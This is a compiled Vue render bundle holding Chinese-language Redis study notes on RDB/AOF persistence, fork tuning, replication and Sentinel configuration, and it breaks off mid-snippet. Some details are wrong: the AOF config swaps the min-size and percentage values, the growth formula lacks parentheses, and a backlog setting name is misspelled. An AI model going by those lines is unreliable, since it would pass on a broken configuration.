\"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"11\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"12\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"13\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"14\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"15\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"16\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"17\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"18\")]),t(\"br\")])]),t(\"h2\",{attrs:{id:\"持久化\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#持久化\"}},[s._v(\"#\")]),s._v(\" 持久化\")]),s._v(\" \"),t(\"p\",[s._v(\"redis 所有数据保存在内存中，对数据的更新将异步地保存在磁盘上\")]),s._v(\" \"),t(\"h3\",{attrs:{id:\"rdb\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#rdb\"}},[s._v(\"#\")]),s._v(\" RDB\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"触发机制\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#触发机制\"}},[s._v(\"#\")]),s._v(\" 触发机制\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"save(同步)\")]),s._v(\" \"),t(\"li\",[s._v(\"bgsave(异步)\")]),s._v(\" \"),t(\"li\",[s._v(\"自动\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"配置-2\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#配置-2\"}},[s._v(\"#\")]),s._v(\" 配置\")]),s._v(\" \"),t(\"div\",{staticClass:\"language- line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[t(\"code\",[s._v(\"save 900 1\\nsave 300 10\\nsave 60 10000\\ndbfilename dump-${port}.rdb\\ndir /bigdiskpath\\nstop-writes-on-bgsave-err yes\\nrdbcompression yes\\nrdbchecksum yes\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\")])]),t(\"h4\",{attrs:{id:\"触发机制-不可忽略方式\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#触发机制-不可忽略方式\"}},[s._v(\"#\")]),s._v(\" 触发机制-不可忽略方式\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"全量复制\")]),s._v(\" \"),t(\"li\",[s._v(\"debug reload\")]),s._v(\" \"),t(\"li\",[s._v(\"shutdown\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"总结\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#总结\"}},[s._v(\"#\")]),s._v(\" 总结\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"RDB 是 Redis 内存到硬盘的快照，用于持久化\")]),s._v(\" \"),t(\"li\",[s._v(\"save 通常会阻塞 Redis\")]),s._v(\" \"),t(\"li\",[s._v(\"bgsave 不会阻塞 Redis，但是会 fork 新进程\")]),s._v(\" \"),t(\"li\",[s._v(\"save 自动配置满足任一就会被执行\")]),s._v(\" \"),t(\"li\",[s._v(\"有些触发机制不容忽视\")])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"aof\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#aof\"}},[s._v(\"#\")]),s._v(\" AOF\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"策略\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#策略\"}},[s._v(\"#\")]),s._v(\" 策略\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"always\")]),s._v(\" \"),t(\"li\",[s._v(\"everysec\")]),s._v(\" \"),t(\"li\",[s._v(\"no\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"aof-重写作用\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#aof-重写作用\"}},[s._v(\"#\")]),s._v(\" AOF 重写作用\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"减少硬盘占有量\")]),s._v(\" \"),t(\"li\",[s._v(\"加速恢复速度\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"aof-重写两种方式\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#aof-重写两种方式\"}},[s._v(\"#\")]),s._v(\" AOF 重写两种方式\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"bgrewriteaof\")]),s._v(\" \"),t(\"li\",[s._v(\"AOF 重写配置\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"aof-重写配置\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#aof-重写配置\"}},[s._v(\"#\")]),s._v(\" AOF 重写配置\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"配置\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language- line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[t(\"code\",[s._v(\"#AOD重写需要的尺寸\\nauto-aof-rewrite-min-size\\n#AOF文件增长率\\nauto-aof-rewrite-percentage\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\")])]),t(\"ul\",[t(\"li\",[s._v(\"统计\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language- line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[t(\"code\",[s._v(\"#AOF当前尺寸(单位：字节)\\naof_current_size\\n#AOF上次启动和重写的尺寸(单位：字节)\\naof_base_size\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\")])]),t(\"h4\",{attrs:{id:\"自动触发时机\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#自动触发时机\"}},[s._v(\"#\")]),s._v(\" 自动触发时机\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"aof_current_size > auto-aof-rewrite-min-size\")]),s._v(\" \"),t(\"li\",[s._v(\"aof_current_size - aof_base_size / aof_base_size > auto-aof-rewrite-percentage\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"配置-3\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#配置-3\"}},[s._v(\"#\")]),s._v(\" 配置\")]),s._v(\" \"),t(\"div\",{staticClass:\"language- line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[t(\"code\",[s._v('appendonly yes\\nappendfilename \"appendonly-${port}.aof\"\\nappendfsync everysec\\ndir /bigdiskpath\\nno-appendfsync-on-rewrite yes\\nauto-aof-rewrite-min-size 100\\nauto-aof-rewrite-percentage 64mb\\n')])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\")])]),t(\"h3\",{attrs:{id:\"rdb-和-aof-选择\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#rdb-和-aof-选择\"}},[s._v(\"#\")]),s._v(\" RDB 和 AOF 选择\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"rdb-最佳策略\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#rdb-最佳策略\"}},[s._v(\"#\")]),s._v(\" RDB 最佳策略\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v('\"关\"')]),s._v(\" \"),t(\"li\",[s._v(\"集中管理\")]),s._v(\" \"),t(\"li\",[s._v(\"主从，从开\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"aof-最佳策略\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#aof-最佳策略\"}},[s._v(\"#\")]),s._v(\" AOF 最佳策略\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v('\"开\"：缓存和存储')]),s._v(\" \"),t(\"li\",[s._v(\"AOF 重写集中管理\")]),s._v(\" \"),t(\"li\",[s._v(\"everysec\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"最佳策略\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#最佳策略\"}},[s._v(\"#\")]),s._v(\" 最佳策略\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"小分片\")]),s._v(\" \"),t(\"li\",[s._v(\"缓存或者存储\")]),s._v(\" \"),t(\"li\",[s._v(\"监控(硬盘、内存、负载、网络)\")]),s._v(\" \"),t(\"li\",[s._v(\"足够内存\")])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"常见问题\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#常见问题\"}},[s._v(\"#\")]),s._v(\" 常见问题\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"fork-操作\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#fork-操作\"}},[s._v(\"#\")]),s._v(\" fork 操作\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"同步操作\")]),s._v(\" \"),t(\"li\",[s._v(\"与内存量息息相关：内存越大，耗时越长(与机器类型有关)\")]),s._v(\" \"),t(\"li\",[s._v(\"info:latest_fork_usec\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"改善-fork\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#改善-fork\"}},[s._v(\"#\")]),s._v(\" 改善 fork\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"优先使用物理机或者高效支持 fork 操作的虚拟化技术\")]),s._v(\" \"),t(\"li\",[s._v(\"控制 Redis 实例最大可用内存：maxmemory\")]),s._v(\" \"),t(\"li\",[s._v(\"合理配置 Linux 内存分配策略：vm.overcommit_memory=1\")]),s._v(\" \"),t(\"li\",[s._v(\"降低 fork 频率：例如放宽 AOF 重写自动触发时机，不必要的全量复制\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"子进程开销和优化\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#子进程开销和优化\"}},[s._v(\"#\")]),s._v(\" 子进程开销和优化\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"CPU\")])]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"开销：RDB 和 AOF 文件生成，属于 CPU 密集型\")]),s._v(\" \"),t(\"li\",[s._v(\"优化：不做 CPU 绑定，不和 CPU 密集型部署\")])]),s._v(\" \"),t(\"ol\",{attrs:{start:\"2\"}},[t(\"li\",[s._v(\"内存\")])]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"开销：fork 内存开销，copy-on-write\")]),s._v(\" \"),t(\"li\",[s._v(\"优化：echo never > /sys/kernel/mm/transparent_hugepage/enabled\")])]),s._v(\" \"),t(\"ol\",{attrs:{start:\"3\"}},[t(\"li\",[s._v(\"硬盘\")])]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"开销：AOF 和 RDB 文件写入，可以结合 iostat,iotop 分析\")]),s._v(\" \"),t(\"li\",[s._v(\"优化：\\n\"),t(\"ul\",[t(\"li\",[s._v(\"不要和高硬盘负载服务部署一起：存储服务、消息队列等\")]),s._v(\" \"),t(\"li\",[s._v(\"no-appendfsync-on-rewrite = yes\")]),s._v(\" \"),t(\"li\",[s._v(\"根据写入量决定磁盘类型：例如 ssd\")]),s._v(\" \"),t(\"li\",[s._v(\"单机多实例持久化文件目录可以考虑分盘\")])])])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"aof-阻塞定位\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#aof-阻塞定位\"}},[s._v(\"#\")]),s._v(\" AOF 阻塞定位\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"Redis 日志：Asynchronous AOF fsync is taking too long (disk is busy?). Writing the AOF buffer without waiting for fsync to complete, this may slow down Redis.\")]),s._v(\" \"),t(\"li\",[t(\"code\",[s._v(\"info persistence\")])]),s._v(\" \"),t(\"li\",[t(\"code\",[s._v(\"top\")])])]),s._v(\" \"),t(\"h2\",{attrs:{id:\"主从复制\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#主从复制\"}},[s._v(\"#\")]),s._v(\" 主从复制\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"一个 master 可以有多个 slave\")]),s._v(\" \"),t(\"li\",[s._v(\"一个 slave 只能有一个 master\")]),s._v(\" \"),t(\"li\",[s._v(\"数据流向是单向的，master 到 slave\")])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"主从复制配置\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#主从复制配置\"}},[s._v(\"#\")]),s._v(\" 主从复制配置\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"slaveof 命令\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[s._v(\"slaveof \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1 \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"6379\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#取消复制\")]),s._v(\"\\nslaveof no one\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\")])]),t(\"ul\",[t(\"li\",[s._v(\"修改配置\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[s._v(\"slaveof \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"ip\")]),s._v(\" port\\nslave-read-only \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"yes\")]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\")])]),t(\"h3\",{attrs:{id:\"全量复制开销\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#全量复制开销\"}},[s._v(\"#\")]),s._v(\" 全量复制开销\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"bgsave 时间\")]),s._v(\" \"),t(\"li\",[s._v(\"RDB 文件网络传输时间\")]),s._v(\" \"),t(\"li\",[s._v(\"从节点清空数据时间\")]),s._v(\" \"),t(\"li\",[s._v(\"从节点加载 RDB 的时间\")]),s._v(\" \"),t(\"li\",[s._v(\"可能的 AOF 重写时间\")])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"常见问题-2\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#常见问题-2\"}},[s._v(\"#\")]),s._v(\" 常见问题\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"读写分离\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#读写分离\"}},[s._v(\"#\")]),s._v(\" 读写分离\")]),s._v(\" \"),t(\"p\",[s._v(\"读流量分摊到从节点\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"复制数据延迟\")]),s._v(\" \"),t(\"li\",[s._v(\"读到过期数据\")]),s._v(\" \"),t(\"li\",[s._v(\"从节点故障\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"配置不一致\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#配置不一致\"}},[s._v(\"#\")]),s._v(\" 配置不一致\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"例如 maxmemory 不一致：丢失数据\")]),s._v(\" \"),t(\"li\",[s._v(\"例如数据结构优化参数(例如 hash-max-ziplist-entries)：内存不一致\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"规避全量复制\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#规避全量复制\"}},[s._v(\"#\")]),s._v(\" 规避全量复制\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"第一次全量复制\")])]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"第一次不可避免\")]),s._v(\" \"),t(\"li\",[s._v(\"小主节点、低峰\")])]),s._v(\" \"),t(\"ol\",{attrs:{start:\"2\"}},[t(\"li\",[s._v(\"节点运行 ID 不匹配\")])]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"主节点重启(运行 ID 变化)\")]),s._v(\" \"),t(\"li\",[s._v(\"故障转移，例如哨兵或集群\")])]),s._v(\" \"),t(\"ol\",{attrs:{start:\"3\"}},[t(\"li\",[s._v(\"复制积压缓冲区不足\")])]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"网络中断，部分复制无法满足\")]),s._v(\" \"),t(\"li\",[s._v('增大复制缓冲区配置 rel_backlog_size，网络\"增强\"')])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"规避复制风暴\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#规避复制风暴\"}},[s._v(\"#\")]),s._v(\" 规避复制风暴\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"单节点复制风暴\")])]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"问题：主节点重启，多从节点复制\")]),s._v(\" \"),t(\"li\",[s._v(\"解决：更换复制拓扑\")])]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"单机器复制风暴\")])]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"机器宕机后，大量全量复制\")]),s._v(\" \"),t(\"li\",[s._v(\"主节点分数多机器\")])]),s._v(\" \"),t(\"h2\",{attrs:{id:\"redis-sentinel\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#redis-sentinel\"}},[s._v(\"#\")]),s._v(\" Redis Sentinel\")]),s._v(\" \"),t(\"h3\",{attrs:{id:\"redis-sentinel-故障转移\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#redis-sentinel-故障转移\"}},[s._v(\"#\")]),s._v(\" Redis Sentinel 故障转移\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"多个 sentinel 发现并确认 master 有问题\")]),s._v(\" \"),t(\"li\",[s._v(\"选举出一个 sentinel 作为领导\")]),s._v(\" \"),t(\"li\",[s._v(\"选出一个 slave 作为 master\")]),s._v(\" \"),t(\"li\",[s._v(\"通知其余 slave 成为新的 master 的 slave\")]),s._v(\" \"),t(\"li\",[s._v(\"通知客户端主从变化\")])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"安装与配置\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#安装与配置\"}},[s._v(\"#\")]),s._v(\" 安装与配置\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"配置开启主从节点\")]),s._v(\" \"),t(\"li\",[s._v(\"配置开启 sentinel 监控主节点(sentinel 是特殊的 redis)\")]),s._v(\" \"),t(\"li\",[s._v(\"实际应该多机器\")]),s._v(\" \"),t(\"li\",[s._v(\"详细配置节点\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"master\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#master\"}},[s._v(\"#\")]),s._v(\" Master\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"启动\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[s._v(\"redis-server redis-7000.conf\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\")])]),t(\"ul\",[t(\"li\",[s._v(\"配置\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[s._v(\"port \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7000\")]),s._v(\"\\ndaemonize \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"yes\")]),s._v(\"\\npidfile /var/run/redis-7000.pid\\nlogfile \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"7000.log\"')]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"dir\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"/usr/local/redis/data/\"')]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\")])]),t(\"h4\",{attrs:{id:\"slave\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#slave\"}},[s._v(\"#\")]),s._v(\" Slave\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"启动\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[s._v(\"redis-server redis-7001.conf\\nredis-server redis-7002.conf\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\")])]),t(\"ul\",[t(\"li\",[s._v(\"配置\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#slave-1\")]),s._v(\"\\nport \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7001\")]),s._v(\"\\ndaemonize \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"yes\")]),s._v(\"\\npidfile /var/run/redis-7001.pid\\nlogfile \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"7001.log\"')]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"dir\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"/usr/local/redis/data/\"')]),s._v(\"\\nslaveof \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1 \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7000\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#slave-2\")]),s._v(\"\\nport \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7002\")]),s._v(\"\\ndaemonize \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"yes\")]),s._v(\"\\npidfile /var/run/redis-7002.pid\\nlogfile \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"7002.log\"')]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"dir\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"/usr/local/redis/data/\"')]),s._v(\"\\nslaveof \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1 \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7000\")]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"11\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"12\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"13\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"14\")]),t(\"br\")])]),t(\"h4\",{attrs:{id:\"sentinel-主要配置\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#sentinel-主要配置\"}},[s._v(\"#\")]),s._v(\" sentinel 主要配置\")]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"vim\")]),s._v(\" redis-sentinel-26379.conf\\n\\nport \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"26379\")]),s._v(\"\\ndaemonize \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"yes\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"dir\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"/usr/local/redis/data/\"')]),s._v(\"\\nlogfile \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"26379.log\"')]),s._v(\"\\nsentinel monitor mymaster \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1 \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7000\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"2\")]),s._v(\"\\nsentinel down-after-milliseconds mymaster \"),t(\"span\",{pre:!0,attrs:{class:\"token 